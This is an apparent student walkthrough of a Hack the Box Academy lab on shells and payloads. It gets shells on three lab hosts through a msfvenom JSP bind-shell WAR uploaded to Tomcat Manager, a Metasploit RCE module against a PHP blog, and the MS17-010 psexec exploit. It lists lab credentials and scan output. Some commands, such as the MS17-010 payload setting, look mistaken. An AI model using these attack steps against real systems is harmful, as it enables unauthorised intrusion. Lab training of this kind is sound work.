# Background:

This is is a walk-through for the Hack the Box Academy's module Shells & Payloads.

CAT5's team proided a foothold on Inlanefreight's network. They've also provied recon data for our target. There is a Web app, a Windows, and a Linux host or server on the network and we need to find a sutable payload to exploit each machine. Our goal is to get a shell on each system.

We will need to Remote Desktop Protocol (RDP) into the foothold host and perform out attack from there. 

The addresses of the targets are:

Host 1:

      172.16.1.11

Host 2:

      blog.inlanefreight.local

Host 3:

      172.16.1.13

# RDP Credentials:

We can login to the foothold with:

- IP:

      10.129.204.126

- Username:

      htb-student

- Password:

      HTB_@cademy_stdnt! 


## Connect To The Foothold:

Now that we're up to speed, lets get started with our attack!

First we'll connect with XfreeRDP by running the following cmd in the terminal:

      xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!


# Investigate The Environment:

Now that were in their network, lets look around and see what were dealing with.

If we read the "access-creds.txt" file, we appear to have credentials:

      cat Desktop/access-creds.txt
      to manage the blog:
      - admin / admin123!@#  ( keep it simple for the new admins )
      
      to manage Tomcat on apache
      - tomcat / Tomcatadm
      
      
      Change the passwords soon..

The last command entered in the terminal was

      sudo su

- We can use this command to switch to the root user.


# Host 1:

## Recon:

Lets begin with enumeration:

      nmap 172.16.1.11 -sV -sC
      Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-20 22:30 EDT
      Nmap scan report for status.inlanefreight.local (172.16.1.11)
      Host is up (0.043s latency).
      Not shown: 989 closed tcp ports (conn-refused)
      PORT     STATE SERVICE       VERSION
      80/tcp   open  http          Microsoft IIS httpd 10.0
      |_http-server-header: Microsoft-IIS/10.0
      | http-methods: 
      |_  Potentially risky methods: TRACE
      |_http-title: Inlanefreight Server Status
      135/tcp  open  msrpc         Microsoft Windows RPC
      139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
      445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
      515/tcp  open  printer
      1801/tcp open  msmq?
      2103/tcp open  msrpc         Microsoft Windows RPC
      2105/tcp open  msrpc         Microsoft Windows RPC
      2107/tcp open  msrpc         Microsoft Windows RPC
      3389/tcp open  ms-wbt-server Microsoft Terminal Services
      | rdp-ntlm-info: 
      |   Target_Name: SHELLS-WINSVR
      |   NetBIOS_Domain_Name: SHELLS-WINSVR
      |   NetBIOS_Computer_Name: SHELLS-WINSVR
      |   DNS_Domain_Name: shells-winsvr
      |   DNS_Computer_Name: shells-winsvr
      |   Product_Version: 10.0.17763
      |_  System_Time: 2026-06-21T02:31:03+00:00
      |_ssl-date: 2026-06-21T02:31:08+00:00; 0s from scanner time.
      | ssl-cert: Subject: commonName=shells-winsvr
      | Not valid before: 2026-06-20T01:35:10
      |_Not valid after:  2026-12-20T01:35:10
      8080/tcp open  http          Apache Tomcat 10.0.11
      |_http-open-proxy: Proxy might be redirecting requests
      |_http-favicon: Apache Tomcat
      |_http-title: Apache Tomcat/10.0.11
      Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
      
      Host script results:
      | smb-os-discovery: 
      |   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
      |   Computer name: shells-winsvr
      |   NetBIOS computer name: SHELLS-WINSVR\x00
      |   Workgroup: WORKGROUP\x00
      |_  System time: 2026-06-20T19:31:02-07:00
      | smb-security-mode: 
      |   account_used: guest
      |   authentication_level: user
      |   challenge_response: supported
      |_  message_signing: disabled (dangerous, but default)
      |_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:9e:03:82 (unknown)
      |_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s
      | smb2-security-mode: 
      |   3.1.1: 
      |_    Message signing enabled but not required
      | smb2-time: 
      |   date: 2026-06-21T02:31:03
      |_  start_date: N/A

Looks like wever got an SMB server. Also, notice that it is running "Apache Tomcat", recall that we have credentials that may work here. Lets see if we can use the login info and smbclient to enumerate the shares: 

      smbclient -U tomcat%Tomcatadm -L //172.16.1.11
      
      	Sharename       Type      Comment
      	---------       ----      -------
      	ADMIN$          Disk      Remote Admin
      	C$              Disk      Default share
      	dev-share       Disk      
      	IPC$            IPC       Remote IPC
      	Users           Disk      
      SMB1 disabled -- no workgroup available

As we can see, the username and passwd are allowing us to ccess the system.


## Exploit:

Now lets focus on the look at the http server on port 8080, for this we'll open a browser with the command:

      firefox

- If you are root this may not work, in that case exit to htb-student

Now navigate the page at:

      http://172.16.1.11:8080

- If prompted to login, the creds are:

        Username: tomcat

        Password: Tomcatadm

- Next click on the button "Manager App". THis will take us to:

      http://172.16.1.11:8080/manager/html

Notice that this pages contains a section: "WAR file to deploy"

- Lets see if we can exploit this.

First well use msf to generate a payload.

      msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f war > file.war

Now we can upload and deploy file.war, if successful, it will bind a shell on port 4444.

After it is added to the "Applications" table, click on the path "/file". Once the wepage has loaded run this command to connect to the shell: 

      nc -nv 172.16.1.11 4444

- And now we're in!

To get the hostname run:

      hostname

And we can find folder name that is in the Shares folder with:

      dir \Shares\



# Host 2:

## Recon:

Now lets scan the website.

      nmap blog.inlanefreight.local -sV -sC
      Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-20 22:48 EDT
      Nmap scan report for blog.inlanefreight.local (172.16.1.12)
      Host is up (0.045s latency).
      Not shown: 998 closed tcp ports (conn-refused)
      PORT   STATE SERVICE VERSION
      22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
      |   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
      |_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
      80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
      |_http-title: Inlanefreight Gabber
      | http-robots.txt: 1 disallowed entry 
      |_/
      |_http-server-header: Apache/2.4.41 (Ubuntu)
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- From the scan we see that the website is using Ubuntu

To gather more info, lets see the header.

      curl http://blog.inlanefreight.local/ -sI
      HTTP/1.1 200 OK
      Date: Sun, 21 Jun 2026 02:51:00 GMT
      Server: Apache/2.4.41 (Ubuntu)
      Set-Cookie: PHPSESSID=fncu4mrpm0fs0of8iqhhs2b58c; path=/; HttpOnly
      Expires: Thu, 19 Nov 1981 08:52:00 GMT
      Cache-Control: no-store, no-cache, must-revalidate
      Pragma: no-cache
      Content-Type: text/html; charset=UTF-8

-  Based on the cookie, we can determine that its running PHP.

Lets see if we can find any directories:

      gobuster dir -b 400,403,404,500 -u http://blog.inlanefreight.local -w /usr/share/wfuzz/wordlist/general/common.txt

- This yeilds two:

      /app                  (Status: 301) [Size: 334] [--> http://blog.inlanefreight.local/app/]
      /data                 (Status: 301) [Size: 335] [--> http://blog.inlanefreight.local/data/]

- If we go to http://blog.inlanefreight.local/data/config.ini, we can find valuable information, including root credientials for a mysql login: 

      ;[database]
      db_connection = mysql
      mysql_socket = /var/run/mysqld/mysqld.sock
      mysql_host = 127.0.0.1
      mysql_port = 3306
      mysql_user = root
      mysql_pass = "HTB_@cademy_r00t!"
      db_name = blog


## Exploit:

Now that we are situated, let's attack.

First go to 

      http://blog.inlanefreight.local

- Then scroll down past the picture of the boat, to the "Login" button.

      
        Username: admin

        Password: admin123!@#

Once we've logged in, there's a form to POST data thats waiting for us to exploit it.

- Also, if we look at Slade Wilson's last post, he seems to have found a vulenerabiliy in the blog, 50064.

  - This is a Remote Code Execution (RCE) exploit that targets an authenticated file upload vulnerability found in PHP blogs.

We can find the script on our system with:

      locate 50064
      ...
      /usr/share/metasploit-framework/modules/exploits/50064.rb

Next, well copy it:

      cp /usr/share/metasploit-framework/modules/exploits/50064.rb 50064.rb

Let's start metasploit, and use the script we just copied:

      use 50064.rb

- Now we can configure the script:
      
      set RHOSTS 172.16.1.12
      set USERNAME admin
      set PASSWORD admin123!@#
      set VHOST blog.inlanefreight.local

And if we run it, we can get our shell, from there the flag is easy to find:

      cat /customscripts/flag.txt



# Host 3:

## Recon:

We will also start with an nmap scan of the 3rd host:

      nmap 172.16.1.13 -sV -sC
      Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-20 22:33 EDT
      Nmap scan report for 172.16.1.13
      Host is up (0.038s latency).
      Not shown: 996 closed tcp ports (conn-refused)
      PORT    STATE SERVICE      VERSION
      80/tcp  open  http         Microsoft IIS httpd 10.0
      |_http-server-header: Microsoft-IIS/10.0
      | http-methods: 
      |_  Potentially risky methods: TRACE
      |_http-title: 172.16.1.13 - /
      135/tcp open  msrpc        Microsoft Windows RPC
      139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
      445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
      Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
      
      Host script results:
      | smb-security-mode: 
      |   account_used: guest
      |   authentication_level: user
      |   challenge_response: supported
      |_  message_signing: disabled (dangerous, but default)
      |_clock-skew: mean: 2h19m51s, deviation: 4h02m29s, median: -8s
      |_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:b0:b8:19 (unknown)
      | smb-os-discovery: 
      |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
      |   Computer name: SHELLS-WINBLUE
      |   NetBIOS computer name: SHELLS-WINBLUE\x00
      |   Workgroup: WORKGROUP\x00
      |_  System time: 2026-06-20T19:33:30-07:00
      | smb2-time: 
      |   date: 2026-06-21T02:33:30
      |_  start_date: 2026-06-21T01:34:52
      | smb2-security-mode: 
      |   3.1.1: 
      |_    Message signing enabled but not required

We've got an smb server running an outdated version:

      445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds

- An nmap scan reveals that its got a high risk vulnerablity to CVE-2017-0143.

      nmap 172.16.1.13 -p 139,445 --script=vuln
      Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-24 21:43 EDT
      Pre-scan script results:
      | broadcast-avahi-dos: 
      |   Discovered hosts:
      |     224.0.0.251
      |   After NULL UDP avahi packet DoS (CVE-2011-1002).
      |_  Hosts are all up (not vulnerable).
      Nmap scan report for 172.16.1.13
      Host is up (0.00069s latency).
      
      PORT    STATE SERVICE
      139/tcp open  netbios-ssn
      445/tcp open  microsoft-ds
      MAC Address: A2:DE:AD:FA:82:BA (Unknown)
      
      Host script results:
      | smb-vuln-ms17-010: 
      |   VULNERABLE:
      |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
      |     State: VULNERABLE
      |     IDs:  CVE:CVE-2017-0143
      |     Risk factor: HIGH
      |       A critical remote code execution vulnerability exists in Microsoft SMBv1
      |        servers (ms17-010).
      |           
      |     Disclosure date: 2017-03-14
      |     References:
      |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
      |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
      |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/


## Exploit:

Startup msfconsole and search for a sutable exploit. 

      grep ms17-010 search exploit

- Lets use: ms17_010_psexec

      use exploit/windows/smb/ms17_010_psexec

- Next we need to configure the script:

      set RHOSTS 172.16.1.13

If we run this, we'll see that the standard payload dosent get us a shell, so lets try a different payload and see what happens:

      set PAYLOAD windows/smb/ms17_010_psexec

After running the script we can see that we've got a Meterpreter session! Lets drop into a cmd.exe shell:

      shell

- And then to a powershell:

      powershell

Now we can complete the module by getting the hostname:

      hostname

- And then the flag:

      cat C:\Users\Administrator\Desktop\Skills-flag.txt

Congrats! You've just completed the Skills Assesment for Shells and Payloads!
